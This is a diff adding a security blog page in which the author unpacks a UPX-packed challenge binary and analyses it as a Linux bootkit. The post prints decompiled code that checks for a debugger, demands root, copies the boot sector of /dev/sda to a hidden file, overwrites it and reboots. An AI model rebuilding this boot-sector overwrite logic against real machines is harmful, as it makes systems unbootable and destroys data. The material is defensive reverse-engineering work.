@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.85.0" />
+
+
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/dsrkafuu/dsr-cdn-main@1/images/favicons/dsrca.ico" />
+
+
+
+<title>My First Malware Analysis - Sudoeruser</title>
+
+
+<meta name="author" content="Sudoeruser" />
+
+
+<meta name="description" content="Sudoeruser Notes About Security." />
+
+
+<meta name="keywords" content="UPX, Unpacking, Malware, Analyzing, Reversing" />
+
+
+<meta property="og:title" content="My First Malware Analysis" />
+<meta name="twitter:title" content="My First Malware Analysis" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sudoeruser.github.io/post/first-analysis/" /><meta property="og:description" content="Last month, one of my friends sent me a challenge in the reverse engineering field. In the beginning, I was busy and I could not work on this challenge. But one thing caught my eye. And it was a binary compressed using UPX.
+I tried to decompress that with the UPX program but it did not work. so I created a new binary and compared them in hexdump view. several parts related to UPX headers had changed. The bad news was that I had no idea about the headers of this program.
+but As you know, there is always good news among bad news :). The UPX is an Open Source Program and we can check the codes." />
+<meta name="twitter:description" content="Last month, one of my friends sent me a challenge in the reverse engineering field. In the beginning, I was busy and I could not work on this challenge. But one thing caught my eye. And it was a binary compressed using UPX.
+I tried to decompress that with the UPX program but it did not work. so I created a new binary and compared them in hexdump view. several parts related to UPX headers had changed. The bad news was that I had no idea about the headers of this program.
+but As you know, there is always good news among bad news :). The UPX is an Open Source Program and we can check the codes." /><meta name="twitter:card" content="summary" /><meta property="article:published_time" content="2021-08-06T17:55:04+04:30" /><meta property="article:modified_time" content="2021-08-06T17:55:04+04:30" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+
+<link rel="stylesheet" href="https://sudoeruser.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+
+
+
+</head>
+
+<body
+  data-theme="auto"
+  data-theme-auto='true'
+  >
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://sudoeruser.github.io">Sudoeruser</a>
+            
+            <span class="title-sub">My Notes About Computer &amp; Cyber Security.</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://sudoeruser.github.io/post/first-analysis/">My First Malware Analysis</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2021-08-06</span>
+
+<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;1061 words</span>
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/upx">UPX</a>&nbsp;<a href="/tags/unpacking">Unpacking</a>&nbsp;<a href="/tags/malware">Malware</a>&nbsp;<a href="/tags/analyzing">Analyzing</a>&nbsp;<a href="/tags/reversing">Reversing</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <p>Last month, one of my friends sent me a challenge in the reverse engineering field. In the beginning, I was busy and I could not work on this challenge. But one thing caught my eye. And it was a binary compressed using UPX.</p>
+<p>I tried to decompress that with the UPX program but it did not work. so I created a new binary and compared them in hexdump view. several parts related to UPX headers had changed. The bad news was that I had no idea about the headers of this program.
+but As you know, there is always good news among bad news :). The UPX is an Open Source Program and we can check the codes.</p>
+<h2 id="main">Main</h2>
+<p>so I started reading the UPX codes and research about headers offset (i write the links in Resources Table).</p>
+<p><img class="img-zoomable" src="https://cujo.com/wp-content/uploads/2020/08/upx14.png" alt="UPX1" />
+</p>
+<p><img class="img-zoomable" src="https://cujo.com/wp-content/uploads/2020/08/upx15.png" alt="UPX2" />
+</p>
+<p><img class="img-zoomable" src="https://cujo.com/wp-content/uploads/2020/08/upx16.png" alt="UPX3" />
+</p>
+<p>well, I wanted to fix the headers by reading another UPX binary. but there is a problem. UPX uses <strong>filesize</strong> for unpacking. at first, I created a fuzzer for p_filesize header bytes But it took a long time to do. suddenly I saw an amazing thing:). we can see the p_filesize field in two places. first in begin of UPX headers and second at end of the file.</p>
+<p>I set the byte values and unpacked the file And this is the beginning of the adventure :).</p>
+<h3 id="review">Review</h3>
+<p>now understanding the program is very easy. I opened the file in <strong>radare2</strong> . We can do a lot of work now.</p>
+<p>I seek the main function and its result:</p>
+<p><img class="img-zoomable" src="/img/first-analysis-disas-main.png" alt="first-analysis-disas-main" />
+</p>
+<p>At first glance, we can see the strings, function names, and their arguments. but let&rsquo;s see the decompiled view:</p>
+<pre><code class="language-c">void main
+    noreturn 
+                (undefined8 param_1, int64_t param_2, int64_t param_3, int64_t param_4, int64_t param_5, 
+                undefined8 param_6, undefined8 param_7, undefined8 param_8)
+
+{
+    uint32_t uVar1;
+    int32_t iVar2;
+    int64_t iVar3;
+    int64_t arg4;
+    int64_t arg3;
+    int64_t in_R8;
+    int64_t in_R9;
+    int64_t arg7;
+    undefined8 var_18h;
+    int64_t var_10h;
+    int64_t var_8h;
+    
+    arg4 = 0;
+    iVar3 = sym.ptrace(0, 0, NULL, NULL);
+    if (iVar3 != 0) {
+        sym.puts(&quot;Oh! Noway! You shouldn\'t run me with a debugger!&quot;);
+    // WARNING: Subroutine does not return
+        sym.exit(1);
+    }
+    uVar1 = sym.getuid();
+    if (uVar1 != 0) {
+        sym.__printf(arg7, param_2, param_3, param_4, param_5, param_6, param_7, param_8, (int64_t)&quot;UID: %d\n&quot;, 
+                    (uint64_t)uVar1, arg3, arg4, in_R8, in_R9);
+    // WARNING: Subroutine does not return
+        sym.exit(1);
+    }
+    iVar3 = sym._IO_fopen64((int64_t)&quot;/dev/sda&quot;, 0x484062);
+    iVar2 = sym.access(&quot;/.bellaciaoo10&quot;, 0);
+    if (iVar2 == 0) {
+        iVar2 = sym.access(&quot;/root/.bellaciaoo10&quot;, 0);
+        if (iVar2 == 0) goto code_r0x00401bbd;
+        var_10h = sym._IO_fopen64((int64_t)&quot;/root/.bellaciaoo10&quot;, 0x484092);
+    }
+    else {
+        var_10h = sym._IO_fopen64((int64_t)&quot;/.bellaciaoo10&quot;, 0x484092);
+    }
+    sym.backup_bootloader(iVar3, (uint32_t)var_10h);
+code_r0x00401bbd:
+    sym.write_bootloader(iVar3);
+    sym.puts(&quot;Wrong password.&quot;);
+    sym._IO_fclose(iVar3);
+    sym._IO_fclose(var_10h);
+    sym.system(&quot;reboot&quot;);
+    sym._IO_fclose(iVar3);
+    sym._IO_fclose(var_10h);
+    // WARNING: Subroutine does not return
+    sym.exit((uint64_t)var_18h._4_4_);
+}
+</code></pre>
+<p>in line 21 we can see a simple Anti Debugger that uses ptrace to detect the Debugger. Next, we see that using the getuid function checks the user access level and this is a scary point. the Program needs root access to continue Otherwise the program will stop. After all this, we get to the heart of the matter.
+the program open <strong>/dev/sda</strong> with <strong>r+b</strong> mode. and checks the stream with access syscall.</p>
+<pre><code class="language-manual">access() checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it is dereferenced.
+
+The  mode  specifies  the accessibility check(s) to be performed, and is either the value F_OK, or a mask consisting of the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the existence of the file.  R_OK,
+W_OK, and X_OK test whether the file exists and grants read, write, and execute permissions, respectively.
+
+The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.  Similarly, for the root user, the  check  uses  the
+set of permitted capabilities rather than the set of effective capabilities; and for non-root users, the check uses an empty set of capabilities.
+
+This  allows set-user-ID programs and capability-endowed programs to easily determine the invoking user's authority.  In other words, access() does not answer the &quot;can I read/write/execute this file?&quot; question.  It answers a
+slightly different question: &quot;(assuming I'm a setuid binary) can the user who invoked me read/write/execute this file?&quot;, which gives set-user-ID programs the possibility to prevent malicious users from causing them  to  read
+files which users shouldn't be able to read.
+
+If the calling process is privileged (i.e., its real UID is zero), then an X_OK check is successful for a regular file if execute permission is enabled for any of the file owner, group, or other.
+</code></pre>
+<p>To continue the program tries to get a backup from the bootloader and then write its bootloader on <strong>/dev/sda</strong> . I provide you with the decompiled code of the functions:</p>
+<pre><code class="language-c">undefined8 sym.backup_bootloader(undefined *arg1, uint32_t arg2)
+
+{
+    undefined8 uVar1;
+    int64_t iVar2;
+    int64_t in_RDX;
+    int64_t extraout_RDX;
+    int64_t extraout_RDX_00;
+    undefined4 in_RSI;
+    int64_t arg2_00;
+    undefined *puVar3;
+    int64_t in_FS_OFFSET;
+    uint32_t var_20h;
+    undefined8 stream;
+    undefined var_dh;
+    int32_t var_ch;
+    int64_t var_8h;
+    
+    iVar2 = CONCAT44(in_RSI, arg2);
+    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
+    puVar3 = arg1;
+    if (iVar2 == 0) {
+        uVar1 = 1;
+        arg2_00 = iVar2;
+    }
+    else {
+        arg2_00 = 0;
+        sym.fseek(arg1, 0, 0);
+        in_RDX = extraout_RDX;
+        for (var_ch = 0; var_ch &lt; 0x200; var_ch = var_ch + 1) {
+            sym._IO_fread((int64_t)&amp;var_dh, 1, 1, arg1);
+            puVar3 = &amp;var_dh;
+            arg2_00 = 1;
+            sym._IO_fwrite((int64_t)puVar3, 1, 1, iVar2);
+            in_RDX = extraout_RDX_00;
+        }
+        uVar1 = 0;
+    }
+    iVar2 = var_8h - *(int64_t *)(in_FS_OFFSET + 0x28);
+    if (iVar2 != 0) {
+        uVar1 = sym.__stack_chk_fail_local(puVar3, arg2_00, in_RDX, iVar2);
+    }
+    return uVar1;
+}
+</code></pre>
+<pre><code class="language-c">undefined8 sym.write_bootloader(undefined8 arg1)
+
+{
+    undefined8 uVar1;
+    int64_t arg4;
+    int64_t arg3;
+    int64_t arg2;
+    undefined *arg1_00;
+    int64_t in_FS_OFFSET;
+    undefined8 stream;
+    int64_t var_11h;
+    undefined uStack17;
+    int64_t var_8h;
+    
+    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
+    var_11h._0_1_ = 0x90;
+    stack0xffffffffffffffee = 0xaa55;
+    sym.fseek(arg1, 0, 0);
+    sym.puts(&quot;Hello after seek&quot;);
+    for (var_11h._1_4_ = 0; ((int32_t)var_11h._1_4_ &lt; 0x1fe &amp;&amp; (var_11h._1_4_ &lt; 0x1b9));
+        var_11h._1_4_ = var_11h._1_4_ + 1) {
+        sym._IO_fwrite((int64_t)(obj.bootloader + (int32_t)var_11h._1_4_), 1, 1, arg1);
+    }
+    sym.puts(&quot;AFter loop&quot;);
+    if ((int32_t)var_11h._1_4_ &lt; 0x1fd) {
+        for (; (int32_t)var_11h._1_4_ &lt; 0x1fe; var_11h._1_4_ = var_11h._1_4_ + 1) {
+            sym._IO_fwrite((int64_t)&amp;var_11h, 1, 1, arg1);
+        }
+    }
+    sym._IO_fwrite((int64_t)&amp;var_11h + 7, 1, 1, arg1);
+    arg1_00 = &amp;uStack17;
+    arg2 = 1;
+    sym._IO_fwrite((int64_t)arg1_00, 1, 1, arg1);
+    uVar1 = 0;
+    arg4 = var_8h - *(int64_t *)(in_FS_OFFSET + 0x28);
+    if (arg4 != 0) {
+        uVar1 = sym.__stack_chk_fail_local(arg1_00, arg2, arg3, arg4);
+    }
+    return uVar1;
+}
+</code></pre>
+<p>and finally, the system will reboot. result:</p>
+<p><img class="img-zoomable" src="/img/first-analysis-finally-result.png" alt="first-analysis-disas-main" />
+</p>
+<table>
+<thead>
+<tr>
+<th>TITLE</th>
+<th>VALUE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MD5</td>
+<td>9979b3d76b2fefde39fe3f0055120aaa</td>
+</tr>
+<tr>
+<td>SHA1</td>
+<td>9506c81377c74781669455927e987189fc54e704</td>
+</tr>
+<tr>
+<td>PLATFORM</td>
+<td>GNU/LINUX</td>
+</tr>
+<tr>
+<td>MALWARE TYPE</td>
+<td>BootKit</td>
+</tr>
+</tbody>
+</table>
+<h2 id="resources">Resources</h2>
+<p><a href="https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/">Cujo.com</a></p>
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>Unless otherwise noted, the content of this site is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a>.</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">Archives</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/sudoeruser" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/sudoeruser" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/analyzing/">Analyzing</a>
+            </span>
+            
+            <span>
+                <a href="/tags/malware/">Malware</a>
+            </span>
+            
+            <span>
+                <a href="/tags/reversing/">Reversing</a>
+            </span>
+            
+            <span>
+                <a href="/tags/unpacking/">Unpacking</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upx/">UPX</a>
+            </span>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3><nav id="TableOfContents">
+  <ul>
+    <li><a href="#main">Main</a>
+      <ul>
+        <li><a href="#review">Review</a></li>
+      </ul>
+    </li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav></div>
+</aside>
+
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">Archives</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/sudoeruser" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/sudoeruser" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/analyzing/">Analyzing</a>
+            </span>
+            
+            <span>
+                <a href="/tags/malware/">Malware</a>
+            </span>
+            
+            <span>
+                <a href="/tags/reversing/">Reversing</a>
+            </span>
+            
+            <span>
+                <a href="/tags/unpacking/">Unpacking</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upx/">UPX</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#main">Main</a>
+      <ul>
+        <li><a href="#review">Review</a></li>
+      </ul>
+    </li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2020-2021
+                <a href="https://sudoeruser.github.io">Sudoeruser</a>
+                 | <a href="https://github.com/dsrkafuu/hugo-theme-fuji">Source code</a> 
+                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+
+</body>
+
+</html>
